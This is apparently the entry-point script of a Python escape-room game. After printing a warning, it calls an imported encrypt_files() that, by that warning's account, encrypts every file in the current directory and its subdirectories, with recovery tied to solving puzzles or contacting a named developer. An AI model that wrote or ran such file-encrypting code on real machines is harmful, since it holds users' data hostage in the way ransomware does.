import sys
from .escape import escape_loop
from .encrypt import encrypt_files


def main():
    if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
        print("You're locked in a small room and have to find your way out.\n"
              "To navigate you need to type in the option you want to do without the \"[]\"\n"
              "(you can also write the number of the position)\n"
              "If you may not solve the puzzles and want to decrypt your files, ask a developer.")
        return 0
    else:
        print("This is for you and has nothing to do with the game.\n"
              "If you continue playing the game all files in the current directory will get encrypted as well as all files in the subdirectories.\n"
              "Make sure that no important data that is required for your computer is listed in here.\n"
              "If you do not manage to solve the game, contact Karl, he will tell you how to get back your data.\n"
              "\n\n"
              "We assume no liability for lost of data.!\n")
        encrypt_files()
        escape_loop()
